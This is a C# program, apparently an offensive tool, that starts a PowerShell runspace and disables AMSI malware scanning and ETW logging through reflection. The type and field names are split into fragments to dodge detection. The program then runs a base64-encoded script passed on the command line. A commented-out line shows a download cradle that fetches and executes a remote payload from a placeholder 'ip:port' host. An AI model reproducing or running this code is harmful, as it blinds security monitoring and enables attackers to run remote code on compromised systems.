using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;

namespace TestExe
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[-] You need input some commands.");
                return;
            }
            Runspace mySpace = RunspaceFactory.CreateRunspace();
            mySpace.Open();
            try{
                mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            }catch{
                Console.WriteLine("[-] Maybe you needn't bypass.");
            }

            try{
                mySpace.GetType().Assembly.GetType("System.Mana" + "gement.Au" + "tomation.Tr" + "acing.PSEtw" + "LogProvider").GetField("etwPro" + "vider", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()));
            }catch{
                Console.WriteLine("[-] Maybe you needn't bypass ETW.");
            }

            Pipeline myPipeLine = mySpace.CreatePipeline();

            try{
                myPipeLine.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(args[0])));
                //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
                Collection<PSObject> outputs = myPipeLine.Invoke();
                System.Text.StringBuilder sb = new StringBuilder();
                foreach (PSObject pobject in outputs)
                {

                    sb.AppendLine(pobject.ToString());

                }
                Console.WriteLine(sb.ToString());
            }catch{
                Console.WriteLine("[-] something wrong with commands.");
            }

            mySpace.Close();
        }
    }
}
